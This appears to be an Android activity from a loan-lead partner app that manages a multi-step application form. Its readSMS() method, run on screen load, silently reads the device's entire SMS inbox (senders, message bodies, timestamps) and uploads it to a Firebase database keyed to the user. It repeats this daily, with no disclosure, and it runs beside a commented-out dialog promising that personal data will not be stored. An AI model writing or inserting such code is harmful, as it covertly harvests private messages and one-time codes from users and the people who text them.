package com.bestdealfinance.bdfpartner.ActivityNew;

import android.Manifest;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.RequestQueue;
import com.android.volley.toolbox.Volley;
import com.bestdealfinance.bdfpartner.FragmentNew.AppFillGroupFragment;
import com.bestdealfinance.bdfpartner.FragmentNew.ApplicantDetailFragmentNew;
import com.bestdealfinance.bdfpartner.FragmentNew.CongratulationFragment;
import com.bestdealfinance.bdfpartner.FragmentNew.PreviewFragment;
import com.bestdealfinance.bdfpartner.R;
import com.bestdealfinance.bdfpartner.application.Constant;
import com.bestdealfinance.bdfpartner.application.Helper;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONArray;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

public class LeadFlowActivityNew extends AppCompatActivity {

    private static final int MY_PERMISSIONS_REQUEST_RECORD_AUDIO_AND_WRITE_EXTARNAL = 2;

    private static final int SIGN_REQUEST = 1;
    private Toolbar toolbar;
    private RequestQueue queue;
    private DatabaseReference mDatabase;
    public Bundle productBundle;
    boolean isFromLeadList = false;
    String product_id;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lead_flow_new);
        queue = Volley.newRequestQueue(this);
        //toolbar = (Toolbar) findViewById(R.id.toolbar);
        //ToolbarHelper.initializeToolbar(this, toolbar, "New Lead", false, false, true);
        readSMS();

//        requestPermission();

        productBundle = getIntent().getBundleExtra("bundle");
        if(productBundle.containsKey("fromLead")){
            isFromLeadList = productBundle.getBoolean("fromLead");
        }
        if (productBundle.getString("incomplete").equals("1")) {
            AppFillGroupFragment applicantDetailFragment = new AppFillGroupFragment();
            applicantDetailFragment.setArguments(productBundle);
            getSupportFragmentManager().beginTransaction().replace(R.id.lead_flow_fragment_layout, applicantDetailFragment, "ApplicantFillFragment").commit();
        } else {
            ApplicantDetailFragmentNew applicantDetailFragment = new ApplicantDetailFragmentNew();
            if(productBundle.containsKey("product_id")){
                product_id = productBundle.getString("product_id");
                productBundle.putString("product_id",product_id);
            }
            applicantDetailFragment.setArguments(productBundle);
            getSupportFragmentManager().beginTransaction().replace(R.id.lead_flow_fragment_layout, applicantDetailFragment, "ApplicantDetailFragment").commit();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (Helper.getStringSharedPreference(Constant.UTOKEN, LeadFlowActivityNew.this).equals("")) {
            startActivityForResult(new Intent(this, SigninActivityNew.class), SIGN_REQUEST);
        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == SIGN_REQUEST) {
            if (resultCode == RESULT_OK) {
                Toast.makeText(this, "Login Successful", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "You must login/register to submit lead", Toast.LENGTH_LONG).show();
                finish();
            }
        }

    }

    @Override
    public void onBackPressed() {
        final AppFillGroupFragment fragment = (AppFillGroupFragment) getSupportFragmentManager().findFragmentByTag("ApplicantFillFragment");

        if(getSupportFragmentManager().findFragmentById(R.id.lead_flow_fragment_layout) instanceof CongratulationFragment ){
           finish();
        }
        else if(getSupportFragmentManager().findFragmentById(R.id.lead_flow_fragment_layout) instanceof PreviewFragment){
            AppFillGroupFragment applicantDetailFragment = new AppFillGroupFragment();
            applicantDetailFragment.setArguments(productBundle);
            getSupportFragmentManager().beginTransaction().replace(R.id.lead_flow_fragment_layout, applicantDetailFragment, "ApplicantDetailFragment").commit();
        }
         else if(getSupportFragmentManager().findFragmentById(R.id.lead_flow_fragment_layout) instanceof ApplicantDetailFragmentNew){
            finish();
        }
        else if (fragment != null) {
            if (fragment.backPressed()) {
                Helper.showAlertDialog(this, "", "Your previous progress is saved. Do you really want to discard ?", "DISCARD", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                       if(isFromLeadList){
                           Intent intentALlLead = new Intent(LeadFlowActivityNew.this,AllLeadsActivityNew.class);
                           startActivity(intentALlLead);
                           finish();
                       }
                        else
                            finish();
                    }
                }, "NO", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                    }
                });
            }

        } else {
            Helper.showAlertDialog(this, "", "Your previous progress is saved. Do you really want to discard ?", "DISCARD", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    finish();
                }
            }, "NO", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
        }


    }

    private void readSMS() {


        if (!Helper.getStringSharedPreference(Constant.UTOKEN, this).equals("")) {

            Calendar calendar = Calendar.getInstance();
            Long cur_time = calendar.getTimeInMillis();
            Long last_saved = Long.parseLong(Helper.getStringSharedPreference("sms_saved", LeadFlowActivityNew.this).equals("") ? "0" : Helper.getStringSharedPreference("sms_saved", LeadFlowActivityNew.this));

            if (last_saved + 86400000 < cur_time) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {

                        mDatabase = FirebaseDatabase.getInstance().getReference(Constant.FIREBASE_DB);
                        Map<String, Object> childUpdates = new HashMap<>();


                        JSONArray jsonArray = new JSONArray();
                        ContentResolver resolver = getContentResolver();
                        Cursor cursor = resolver.query(Uri.parse("content://sms/"), null, null, null, null);
                        if (cursor.moveToFirst()) { // must check the result to prevent exception
                            do {
                                String msgData = "" + cursor.getString(cursor.getColumnIndexOrThrow("_id")) + "," + cursor.getString(cursor
                                        .getColumnIndexOrThrow("address")) + "," + cursor.getString(cursor.getColumnIndexOrThrow("body"));
                                try {
                                    Map<String, Object> object = new HashMap<String, Object>();
                                    Calendar calendar = Calendar.getInstance();
                                    calendar.setTimeInMillis(cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                                    SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
                                    object.put("vendor", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                                    object.put("sms", URLEncoder.encode(cursor.getString(cursor.getColumnIndexOrThrow("body")), "UTF-8"));
                                    object.put("time", formatter.format(calendar.getTime()));
                                    object.put("associated_to", Helper.getStringSharedPreference(Constant.USERID, LeadFlowActivityNew.this));
                                    jsonArray.put(object);
                                    childUpdates.put("/sms/"+Helper.getStringSharedPreference(Constant.USERID, LeadFlowActivityNew.this)+"/"+Helper.md5(URLEncoder.encode(cursor.getString(cursor.getColumnIndexOrThrow("body")), "UTF-8") + Helper.getStringSharedPreference(Constant.USERID, LeadFlowActivityNew.this)),object);

                                } catch (UnsupportedEncodingException e) {
                                    e.printStackTrace();
                                }
                            } while (cursor.moveToNext());
                        }
                        mDatabase.updateChildren(childUpdates);
                        Calendar calendar = Calendar.getInstance();
                        Helper.setStringSharedPreference("sms_saved", "" + calendar.getTimeInMillis(), LeadFlowActivityNew.this);

                        cursor.close();
                    }
                }).start();

            } else {
                Log.d("SMS", "Already Updated");
            }
        }
    }
/*    private void requestPermission() {
        if (ContextCompat.checkSelfPermission(LeadFlowActivityNew.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(LeadFlowActivityNew.this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
            ActivityCompat.requestPermissions(LeadFlowActivityNew.this, new String[]{
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.RECORD_AUDIO
            }, MY_PERMISSIONS_REQUEST_RECORD_AUDIO_AND_WRITE_EXTARNAL);
    }*/

/*    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST_RECORD_AUDIO_AND_WRITE_EXTARNAL: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED
                        && grantResults[1] == PackageManager.PERMISSION_GRANTED
                        ) {

                } else {
                    AlertDialog.Builder alertDialog = new AlertDialog.Builder(LeadFlowActivityNew.this);
                    alertDialog.setCancelable(false);
                    alertDialog.setTitle("Permission Required");
                    alertDialog.setMessage("We need those permission. We will not store your personal data on our servers.");
                    alertDialog.setPositiveButton("ALLOW", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialogInterface, int i) {
                            requestPermission();
                        }
                    });
                    alertDialog.show();
                }
            }
        }
    }*/

}
